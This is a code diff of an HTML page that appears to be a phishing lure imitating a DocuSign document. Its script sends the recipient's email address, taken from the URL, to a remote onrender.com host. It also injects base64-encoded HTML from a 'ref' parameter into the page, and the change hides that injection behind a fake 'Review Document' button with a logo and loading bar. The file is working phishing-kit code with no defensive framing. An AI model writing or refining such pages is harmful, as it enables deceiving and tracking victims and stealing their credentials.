@@ -3,27 +3,16 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css" />
     <script type="text/javascript">
       let hasEmail = new URLSearchParams(window.location.search).has("id");
       if (hasEmail) {
         let email = new URLSearchParams(window.location.search).get("id");
         let payLoad = { id: 0, email: email };
         let emailXhr = new XMLHttpRequest();
-        emailXhr.open("POST", "https://docu-esign-cxo.onrender.com/email", true);
+        emailXhr.open("POST", "https://docu-esign.onrender.com/email", true);
         emailXhr.setRequestHeader("Content-type", "application/json");
         emailXhr.send(JSON.stringify(payLoad));
-
-        let hasRef = new URLSearchParams(window.location.search).has("ref");
-        if (hasRef) {
-          let ref = new URLSearchParams(window.location.search).get("ref");
-          document.write(
-            decodeURIComponent(
-              atob(
-              `${ref}`
-              )
-            )
-          );
-        }
 
         emailXhr.onreadystatechange = function () {
           if (this.readyState == 4 && this.status == 200) {
@@ -34,22 +23,11 @@
       }
     </script>
 
-<!--     <script type="text/javascript">
-      let hasRef = new URLSearchParams(window.location.search).has("ref");
-      if (hasRef) {
-        let ref = new URLSearchParams(window.location.search).get("ref");
-        document.write(
-          decodeURIComponent(
-            atob(
-              `${ref}`
-            )
-          )
-        );
-      }
-    </script> -->
-
     <title>Document</title>
     <style>
+      body {
+        font-family: Arial, Helvetica, sans-serif;
+      }
       #loader {
         width: 0%;
         position: relative;
@@ -77,16 +55,45 @@
       "
     >
       <div style="width: 200px">
-        <img src="./Email_Logo.png" alt="" style="margin-left: 13px" />
+        <img id="image" src="./Email_Logo.png" alt="" style="margin-left: 13px; display: none;" />
         <div
           id="loader"
           style="
             padding: 2px;
             background-color: rgb(30, 76, 161);
             border-radius: 4px;
+            display: none;
           "
         ></div>
+        <button
+          id="review-document"
+          class="w3-button"
+          style="
+            border: 0.5px solid rgba(0, 0, 0, 0.201);
+            padding: 4px;
+            width: 98%;
+            margin-top: 16px;
+          "
+        >
+          Review Document
+        </button>
       </div>
     </div>
+
+    <script type="text/javascript">
+      let hasRef = new URLSearchParams(window.location.search).has("ref");
+      if (hasRef) {
+        let ref = new URLSearchParams(window.location.search).get("ref");
+        document.addEventListener("click", function (e) {
+          if (e.target.id == "review-document") {
+            document.getElementById("review-document").style.display = "none"
+            document.getElementById("image").style.display = "block"
+            document.getElementById("loader").style.display = "block"
+
+            document.write(decodeURIComponent(atob(`${ref}`)));
+          }
+        });
+      }
+    </script>
   </body>
 </html>
